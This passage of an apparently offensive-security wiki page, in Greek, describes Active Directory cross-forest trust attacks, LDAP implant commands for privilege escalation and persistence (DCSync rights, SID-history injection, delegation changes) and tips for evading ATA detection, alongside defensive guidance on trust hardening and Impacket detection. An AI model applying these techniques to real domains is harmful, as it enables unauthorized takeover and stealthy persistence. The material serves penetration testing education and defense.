Για λεπτομερείς πληροφορίες, μπορείτε να μελετήσετε την έρευνα σχετικά με το [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Compromise οποιουδήποτε gMSA στο forest**

Ένα attack vector περιλαμβάνει τη στόχευση privileged gMSAs μέσα στο domain. Το KDS Root key, το οποίο είναι απαραίτητο για τον υπολογισμό των passwords των gMSAs, αποθηκεύεται μέσα στο Configuration NC. Με SYSTEM privileges σε οποιονδήποτε DC, είναι δυνατή η πρόσβαση στο KDS Root key και ο υπολογισμός των passwords οποιουδήποτε gMSA σε ολόκληρο το forest.

Λεπτομερής ανάλυση και step-by-step guidance είναι διαθέσιμα στο:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Συμπληρωματικό delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Πρόσθετη external έρευνα: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

Αυτή η μέθοδος απαιτεί υπομονή, καθώς πρέπει να περιμένετε τη δημιουργία νέων privileged AD objects. Με SYSTEM privileges, ένας attacker μπορεί να τροποποιήσει το AD Schema ώστε να παραχωρήσει σε οποιονδήποτε user πλήρη έλεγχο σε όλες τις classes. Αυτό θα μπορούσε να οδηγήσει σε μη εξουσιοδοτημένη πρόσβαση και έλεγχο σε νεοδημιουργημένα AD objects.

Περισσότερες πληροφορίες είναι διαθέσιμες στο [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Από DA σε EA με ADCS ESC5**

Η ευπάθεια ADCS ESC5 στοχεύει στον έλεγχο των Public Key Infrastructure (PKI) objects, ώστε να δημιουργηθεί ένα certificate template που επιτρέπει authentication ως οποιοσδήποτε user μέσα στο forest. Καθώς τα PKI objects βρίσκονται στο Configuration NC, η παραβίαση ενός writable child DC επιτρέπει την εκτέλεση ESC5 attacks.

Περισσότερες λεπτομέρειες υπάρχουν στο [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Σε scenarios όπου δεν υπάρχει ADCS, ο attacker μπορεί να εγκαταστήσει τα απαραίτητα components, όπως αναφέρεται στο [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) ή bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Σε αυτό το σενάριο, **το domain σας είναι έμπιστο** από ένα εξωτερικό domain, το οποίο σας παρέχει **μη προσδιορισμένα δικαιώματα** σε αυτό. Θα χρειαστεί να βρείτε **ποιοι principals του domain σας έχουν ποια πρόσβαση στο εξωτερικό domain** και στη συνέχεια να προσπαθήσετε να το εκμεταλλευτείτε:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Εξωτερικό Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Σε αυτό το σενάριο, το **domain σας** **εμπιστεύεται** ορισμένα **privileges** σε principal από **διαφορετικά domains**.

Ωστόσο, όταν ένα **domain είναι trusted** από το trusting domain, το trusted domain **δημιουργεί έναν user** με **προβλέψιμο όνομα**, ο οποίος χρησιμοποιεί ως **password το trusted password**. Αυτό σημαίνει ότι είναι δυνατή η **πρόσβαση σε έναν user από το trusting domain για είσοδο στο trusted domain**, ώστε να γίνει enumeration και να επιχειρηθεί περαιτέρω privilege escalation:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Ένας άλλος τρόπος compromise του trusted domain είναι να βρεθεί ένα [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) που έχει δημιουργηθεί προς την **αντίθετη κατεύθυνση** από αυτήν του domain trust, κάτι που δεν είναι ιδιαίτερα συνηθισμένο.

Ένας άλλος τρόπος compromise του trusted domain είναι να παραμείνει ο attacker σε ένα machine στο οποίο μπορεί να αποκτήσει πρόσβαση ένας **user από το trusted domain**, ώστε να συνδεθεί μέσω **RDP**. Στη συνέχεια, ο attacker μπορεί να κάνει code injection στη διεργασία του RDP session και να **αποκτήσει πρόσβαση στο origin domain του victim** από εκεί.\
Επιπλέον, αν ο **victim είχε κάνει mount τον σκληρό του δίσκο**, ο attacker θα μπορούσε, από τη διεργασία του **RDP session**, να αποθηκεύσει **backdoors** στον **startup folder του σκληρού δίσκου**. Αυτή η τεχνική ονομάζεται **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Μετριασμός κατάχρησης domain trust

### **SID Filtering:**

- Ο κίνδυνος επιθέσεων που αξιοποιούν το attribute SID history μέσω forest trusts μετριάζεται με το SID Filtering, το οποίο ενεργοποιείται από προεπιλογή σε όλα τα inter-forest trusts. Αυτό βασίζεται στην παραδοχή ότι τα intra-forest trusts είναι ασφαλή, καθώς σύμφωνα με τη θέση της Microsoft, security boundary θεωρείται το forest και όχι το domain.
- Ωστόσο, υπάρχει ένα μειονέκτημα: το SID filtering μπορεί να διαταράξει εφαρμογές και την πρόσβαση χρηστών, με αποτέλεσμα να απενεργοποιείται περιστασιακά.

### **Selective Authentication:**

- Για inter-forest trusts, η χρήση Selective Authentication διασφαλίζει ότι οι users από τα δύο forests δεν πραγματοποιούν αυτόματα authentication. Αντίθετα, απαιτούνται explicit permissions ώστε οι users να αποκτήσουν πρόσβαση σε domains και servers μέσα στο trusting domain ή forest.
- Είναι σημαντικό να σημειωθεί ότι αυτά τα μέτρα δεν προστατεύουν από την εκμετάλλευση του writable Configuration Naming Context (NC) ή από επιθέσεις στον trust account.

[**Περισσότερες πληροφορίες σχετικά με τα domain trusts στο ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-based AD Abuse από On-Host Implants

Η [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) επανυλοποιεί LDAP primitives τύπου bloodyAD ως x64 Beacon Object Files, τα οποία εκτελούνται εξ ολοκλήρου μέσα σε ένα on-host implant (π.χ. Adaptix C2). Οι operators κάνουν compile το pack με `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, φορτώνουν το `ldap.axs` και στη συνέχεια καλούν `ldap <subcommand>` από το beacon. Όλη η κίνηση χρησιμοποιεί το τρέχον logon security context μέσω LDAP (389), με signing/sealing, ή LDAPS (636), με automatic certificate trust, επομένως δεν απαιτούνται socks proxies ή disk artifacts.<sup>[[4]](#references)</sup>

### LDAP enumeration από την πλευρά του implant

- Τα `get-users`, `get-computers`, `get-groups`, `get-usergroups` και `get-groupmembers` μετατρέπουν short names/OU paths σε πλήρη DNs και κάνουν dump τα αντίστοιχα objects.
- Τα `get-object`, `get-attribute` και `get-domaininfo` ανακτούν arbitrary attributes, συμπεριλαμβανομένων των security descriptors, καθώς και τα forest/domain metadata από το `rootDSE`.
- Τα `get-uac`, `get-spn`, `get-delegation` και `get-rbcd` εμφανίζουν roasting candidates, delegation settings και υπάρχοντα descriptors [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) απευθείας από το LDAP.
- Τα `get-acl` και `get-writable --detailed` αναλύουν το DACL για να παραθέσουν trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) και inheritance, παρέχοντας άμεσους στόχους για ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives για escalation & persistence

- Τα Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) επιτρέπουν στον operator να προετοιμάζει νέα principals ή machine accounts όπου υπάρχουν δικαιώματα OU. Τα `add-groupmember`, `set-password`, `add-attribute` και `set-attribute` κάνουν άμεσο hijack των στόχων μόλις εντοπιστούν δικαιώματα write-property.
- Εντολές εστιασμένες στα ACL, όπως `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` και `add-dcsync`, μετατρέπουν τα WriteDACL/WriteOwner σε οποιοδήποτε AD object σε password resets, έλεγχο group membership ή DCSync replication privileges, χωρίς να αφήνουν artifacts από PowerShell/ADSI. Τα αντίστοιχα `remove-*` καθαρίζουν τα injected ACEs.

### Delegation, roasting και Kerberos abuse

- Τα `add-spn`/`set-spn` κάνουν άμεσα έναν compromised user Kerberoastable. Το `add-asreproastable` (UAC toggle) τον χαρακτηρίζει για AS-REP roasting χωρίς να αγγίζει το password.
- Τα delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) τροποποιούν τα `msDS-AllowedToDelegateTo`, UAC flags ή `msDS-AllowedToActOnBehalfOfOtherIdentity` από το beacon, ενεργοποιώντας constrained/unconstrained/RBCD attack paths και εξαλείφοντας την ανάγκη για remote PowerShell ή RSAT.

### sidHistory injection, OU relocation και διαμόρφωση attack surface

- Το `add-sidhistory` εισάγει privileged SIDs στο SID history ενός controlled principal (δείτε [SID-History Injection](sid-history-injection.md)), παρέχοντας stealthy access inheritance εξ ολοκλήρου μέσω LDAP/LDAPS.
- Το `move-object` αλλάζει το DN/OU υπολογιστών ή χρηστών, επιτρέποντας σε έναν attacker να μετακινήσει assets σε OUs όπου υπάρχουν ήδη delegated rights, πριν κάνει abuse των `set-password`, `add-groupmember` ή `add-spn`.
- Τα tightly scoped removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` κ.λπ.) επιτρέπουν γρήγορο rollback αφού ο operator συλλέξει credentials ή persistence, ελαχιστοποιώντας την τηλεμετρία.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Μάθετε περισσότερα σχετικά με την προστασία των credentials εδώ.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Περιορισμοί Domain Admins**: Συνιστάται οι Domain Admins να επιτρέπεται να κάνουν login μόνο σε Domain Controllers, ώστε να αποφεύγεται η χρήση τους σε άλλους hosts.
- **Προνόμια Service Accounts**: Οι υπηρεσίες δεν θα πρέπει να εκτελούνται με Domain Admin (DA) privileges, ώστε να διατηρείται η ασφάλεια.
- **Περιορισμός προνομίων βάσει χρόνου**: Για εργασίες που απαιτούν DA privileges, η διάρκειά τους θα πρέπει να είναι περιορισμένη. Αυτό μπορεί να επιτευχθεί με: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Μετριασμός LDAP relay**: Ελέγξτε τα Event IDs 2889/3074/3075 και, στη συνέχεια, επιβάλετε LDAP signing και LDAPS channel binding σε DCs/clients, ώστε να αποκλείσετε LDAP MITM/relay attempts.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level fingerprinting of Impacket activity

Αν θέλετε να εντοπίσετε συνηθισμένο AD tradecraft, **μη βασίζεστε μόνο σε artifacts που ελέγχει ο operator**, όπως renamed binaries, service names, temp batch files ή output paths. Καταγράψτε ως baseline τον τρόπο με τον οποίο νόμιμοι Windows clients δημιουργούν [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC και WMI traffic και, στη συνέχεια, αναζητήστε **implementation quirks** που παραμένουν ακόμη και αφού ο operator τροποποιήσει τα `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` ή `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **High-confidence standalone candidates** (αφού επικυρωθούν με βάση το δικό σας baseline):
- Authenticated DCE/RPC με `auth_context_id = 79231 + ctx_id`
- DCE/RPC authentication padding συμπληρωμένο με `0xff`
- LDAP Kerberos binds που τοποθετούν ένα raw Kerberos `AP-REQ` απευθείας στο SPNEGO `mechToken`
- SMB2/3 negotiate requests με ASCII-looking τιμές `ClientGuid`
- WMI `IWbemLevel1Login::NTLMLogin` με το non-standard namespace `//./root/cimv2`
- Hardcoded Kerberos nonce values
- **Καλύτερα ως correlation/scoring features**:
- Sparse ή duplicated Kerberos etype lists, ασυνήθιστα/missing `PA-DATA` ή TGS-REQ etype ordering που διαφέρει από το native Windows
- NTLM Type 1 messages χωρίς version info ή Type 3 messages με null host names
- Raw NTLMSSP σε DCE/RPC αντί για SPNEGO, missing DCE/RPC verification trailers ή SPNEGO/Kerberos OID mismatches
- Αρκετά από αυτά τα traits από το ίδιο host/user/session/time window είναι πολύ ισχυρότερα από οποιοδήποτε μεμονωμένο weak field
- **Χρησιμοποιήστε τα ως enrichment και όχι ως standalone alerts**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names και tool-specific HTTP/WebDAV/RDP/MSSQL strings
- Αυτά αλλάζουν εύκολα από τους operators και χρησιμοποιούνται καλύτερα για να εξηγούν γιατί ένα cross-protocol cluster είναι ύποπτο
- **Operational notes**:
- Ορισμένα από αυτά τα signals απαιτούν decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW ή service-side visibility
- Επικυρώστε τα έναντι Samba/Linux clients, appliances και legacy software πριν τα μετατρέψετε σε alerts
- Προωθήστε τα detections από enrichment -> hunting -> alerting καθώς αυξάνετε την εμπιστοσύνη σας στο baseline

### **Implementing Deception Techniques**

- Η υλοποίηση deception περιλαμβάνει τη δημιουργία παγίδων, όπως decoy users ή computers, με χαρακτηριστικά όπως passwords που δεν λήγουν ή έχουν χαρακτηριστεί ως Trusted for Delegation. Μια λεπτομερής προσέγγιση περιλαμβάνει τη δημιουργία users με συγκεκριμένα rights ή την προσθήκη τους σε high privilege groups.<sup>[[2]](#references)</sup>
- Ένα πρακτικό παράδειγμα είναι η χρήση tools όπως: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Περισσότερες πληροφορίες σχετικά με την ανάπτυξη deception techniques υπάρχουν στο [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **Για User Objects**: Ύποπτες ενδείξεις περιλαμβάνουν atypical ObjectSID, infrequent logons, creation dates και low bad password counts.
- **Γενικές ενδείξεις**: Η σύγκριση των attributes πιθανών decoy objects με εκείνα γνήσιων objects μπορεί να αποκαλύψει ασυνέπειες. Tools όπως το [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) μπορούν να βοηθήσουν στον εντοπισμό τέτοιων deceptions.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Αποφύγετε το session enumeration σε Domain Controllers, ώστε να αποτρέψετε την ATA detection.
- **Ticket Impersonation**: Η χρήση **aes** keys για ticket creation βοηθά στην αποφυγή detection, επειδή δεν γίνεται downgrade σε NTLM.
- **DCSync Attacks**: Συνιστάται η εκτέλεση από non-Domain Controller για την αποφυγή ATA detection, καθώς η απευθείας εκτέλεση από Domain Controller θα ενεργοποιήσει alerts.

## References

- [1] [Ένας οδηγός για την επίθεση σε Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Παραποίηση Trusts για Deception στο Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Από Domain Admin σε Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Συλλογή LDAP BOF - In-Memory LDAP Toolkit για Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec - Holy Shuck! Weaponizing NTLM Hashes ως Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) - Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs - Ανάλυση του Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Ανάληψη ελέγχου Active Directory Accounts μέσω Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Πώς να διαχειριστείτε τις αλλαγές στις secure channel connections του Netlogon που σχετίζονται με το CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Ένα ταξίδι στα ξεχασμένα Null Session και MS-RPC interfaces](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter ως security boundary μεταξύ domains; (Μέρος 4) - Έρευνα για bypass του SID filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter ως security boundary μεταξύ domains; (Μέρος 5) - Golden GMSA trust attack - από child σε parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter ως security boundary μεταξύ domains; (Μέρος 6) - Schema change trust attack - από child σε parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Από DA σε EA με ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Κλιμάκωση από τους admins ενός child domain σε enterprise admins σε 5 λεπτά με abuse του AD CS, συνέχεια](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Ένας ACE κρυμμένος στο μανίκι: Σχεδιασμός Active Directory DACL Backdoors](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Πηγαίος κώδικας του NetExec pre2k module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - msDS-GroupMSAMembership attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
